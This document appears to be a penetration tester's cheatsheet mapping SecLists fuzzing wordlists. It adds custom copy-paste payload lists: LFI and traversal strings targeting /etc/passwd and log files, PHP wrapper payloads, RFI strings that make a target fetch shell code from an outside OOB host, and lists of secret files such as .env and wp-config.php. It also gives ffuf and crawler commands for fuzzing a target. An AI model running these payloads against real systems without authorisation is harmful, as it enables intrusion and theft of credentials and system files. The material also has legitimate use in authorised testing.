---
title: "Wordlists (SecLists Map + Custom Lists)"
type: cheatsheet
tags: [cheatsheet, wordlists, fuzzing, lfi, rfi, seclists]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
---

# Wordlists

Where the fuzz lists live, ready custom lists, and how to build target-specific ones. Feed [[ffuf]] / [[nuclei]] ([[nuclei-arsenal]]) / gobuster.

## SecLists (the standard set)
```bash
apt install seclists        # or: git clone github.com/danielmiessler/SecLists /opt/SecLists
```

| Need | Path (under SecLists/) |
|---|---|
| Dirs/files | `Discovery/Web-Content/{raft-large,directory-list-2.3-medium,common}.txt` |
| API/params | `Discovery/Web-Content/{api/,burp-parameter-names}.txt` |
| LFI | `Fuzzing/LFI/LFI-Jhaddix.txt`, `Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` |
| Path traversal | `Fuzzing/LFI/LFI-LFISuite-pathtotest.txt` |
| SQLi/XSS/SSTI | `Fuzzing/SQLi/`, `Fuzzing/XSS/`, `Fuzzing/template-engines-*` |
| Subdomains | `Discovery/DNS/{subdomains-top1million-110000,bitquark}.txt` |
| Passwords | `Passwords/{rockyou.txt,Leaked-Databases/}` |
| Usernames | `Usernames/{top-usernames-shortlist,xato-net-10-million}.txt` |
| Default creds | `Passwords/Default-Credentials/` -> see [[default-credentials]] |

More: assetnote wordlists (`wordlists.assetnote.io`), `fuzzdb`, `payloadbox`, Kettle's `param-miner` lists.

## Custom: LFI / traversal (copy-paste)
```
/etc/passwd
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ
/var/log/apache2/access.log
```
Generate traversal depth 1..12:
```bash
for i in $(seq 1 12); do printf '%0.s../' $(seq 1 $i); echo "etc/passwd"; done > lfi-depth.txt
```

## Custom: PHP wrappers
```
php://filter/convert.base64-encode/resource=
php://filter/read=string.rot13/resource=
php://input
data://text/plain;base64,
expect://
phar://
zip://
```

## Custom: RFI test
```
http://OOB/shell.txt
http://OOB/shell.txt%00
ftp://OOB/shell.txt
\\OOB\share\shell.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

## Custom: high-value files / endpoints
```
.env .git/config .git/HEAD .svn/entries .DS_Store
wp-config.php config.php settings.py application.properties appsettings.json
/actuator/env /actuator/heapdump /server-status /metrics /debug
/api/swagger.json /openapi.json /graphql /.well-known/security.txt
backup.zip db.sql dump.sql .bak .old ~
```

## Build target-specific lists (best hit rate)
```bash
# crawl the target's own words/paths/params
cewl -d 3 -m 5 https://target -w custom-words.txt
gau target.com | unfurl paths | sort -u > seen-paths.txt
gau target.com | unfurl keys | sort -u > seen-params.txt        # param names to fuzz
katana -u https://target -jc | grep -oP '\?\K[^=]+' | sort -u    # live params
# mutate: add extensions/backups
sed 's/$/.bak/;s/$/.old/;s/$/~/' seen-paths.txt >> fuzz.txt
```

## Use
```bash
ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'https://t/?page=FUZZ' -mr 'root:.*:0:0:'
ffuf -w raft-large-words.txt:FUZZ -u https://t/FUZZ -mc 200,403 -ac
```
See [[lfi-path-traversal]], [[recon-dorks]].
